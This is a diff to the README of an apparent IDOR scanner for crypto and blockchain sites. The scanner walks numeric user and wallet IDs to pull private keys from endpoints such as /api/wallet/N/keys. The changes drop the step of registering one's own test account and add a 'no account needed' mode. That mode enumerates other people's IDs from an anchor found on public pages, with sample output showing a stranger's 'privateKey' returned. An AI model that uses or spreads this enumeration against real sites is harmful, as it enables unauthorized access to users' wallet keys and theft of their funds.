@@ -45,27 +45,25 @@ pip install -r requirements.txt
 
 ## Usage
 
-### Basic scan (sequential ID enumeration)
+### Fully unauthenticated scan (no account needed)
 ```bash
 python crypto_vuln_tester.py --target https://target.example.com
 ```
 
-### Authenticated scan with known user ID (most effective)
+### With an anchor ID spotted on a public page (no login required)
 ```bash
-# Register a test account, get your user ID from the API, then:
+# E.g. you see /user/4821 on a public profile — use that as the anchor
 python crypto_vuln_tester.py \
   --target https://target.example.com \
-  --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... \
-  --id 42 \
+  --id 4821 \
   --max-ids 50
 ```
 
-### Cookie-based session
+### With optional auth token (reaches auth-protected endpoints too)
 ```bash
 python crypto_vuln_tester.py \
   --target https://target.example.com \
-  --cookie "session=abc123; csrf_token=xyz" \
-  --id 1337
+  --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
 ```
 
 ### Skip crawling (faster, pattern-only)
@@ -78,27 +76,38 @@ python crypto_vuln_tester.py \
 
 ---
 
-## How the Attack Works (Step-by-Step)
+## How It Works — No Account Required
+
+The tool uses **differential/baseline analysis** to detect IDOR without registering on the target:
 
 ```
-1. REGISTER
-   └─ Create a free account on the target crypto/blockchain site
+1. CALIBRATE (per endpoint)
+   └─ Hit /api/wallet/999999999/keys with a known-invalid canary ID
+      → Records the "not found" baseline: status, body size, content hash
 
-2. AUTHENTICATE
-   └─ Login and capture the session token/cookie from browser DevTools
+2. ENUMERATE
+   └─ Try IDs 1..N against the same endpoint:
+      GET /api/wallet/1/keys  → 404 "Not Found" (matches baseline, skip)
+      GET /api/wallet/2/keys  → 404 "Not Found" (matches baseline, skip)
+      GET /api/wallet/3/keys  → 200 {"privateKey": "0xabc..."}  ← DEVIATION = IDOR!
+                                    ↑ body 400B larger than baseline, direct key found
 
-3. DISCOVER YOUR ID
-   └─ Call /api/user/me or /api/profile — note your numeric user_id
+3. DETECT
+   └─ Two parallel detection layers:
+      a) Direct: regex/heuristic scan of every response for key material
+      b) Differential: flag any response that deviates from the baseline
+         (different status code, body size >100B from baseline, new JSON fields)
 
-4. ENUMERATE
-   └─ The tool tries IDs: [your_id - 10] through [your_id + N]
-      GET /api/wallet/41/keys  → 403 (good)
-      GET /api/wallet/42/keys  → 200 {"privateKey": "0xYOUR_KEY"}
-      GET /api/wallet/43/keys  → 200 {"privateKey": "0xOTHER_PERSON_KEY"}  ← IDOR!
-
-5. REPORT
-   └─ Save findings, generate HTML/JSON report for the security team
+4. REPORT
+   └─ Save findings, generate HTML/JSON report with remediation guidance
 ```
+
+### Optional: Anchor ID (improves targeting)
+
+If you spot a numeric user/wallet ID anywhere on the public site (a profile page,
+transaction detail, public explorer, etc.) — pass it with `--id N`.
+The tool will enumerate IDs around that anchor for more targeted results.
+No login or registration required.
 
 ---
 
@@ -107,10 +116,10 @@ python crypto_vuln_tester.py \
 | Option | Default | Description |
 |--------|---------|-------------|
 | `--target` | (required) | Target base URL |
-| `--id` | None | Your known user/wallet ID for adjacent enumeration |
+| `--id` | None | Optional anchor ID spotted on a public page (no login needed) |
 | `--token` | None | Bearer token or API key |
 | `--cookie` | None | Session cookie (`name=value; name2=value2`) |
-| `--max-ids` | 20 | Number of IDs to enumerate |
+| `--max-ids` | 30 | Number of IDs to enumerate |
 | `--delay` | 0.5 | Seconds between requests (be respectful) |
 | `--no-crawl` | False | Skip site crawling |
 | `--output-dir` | `./reports` | Report output directory |
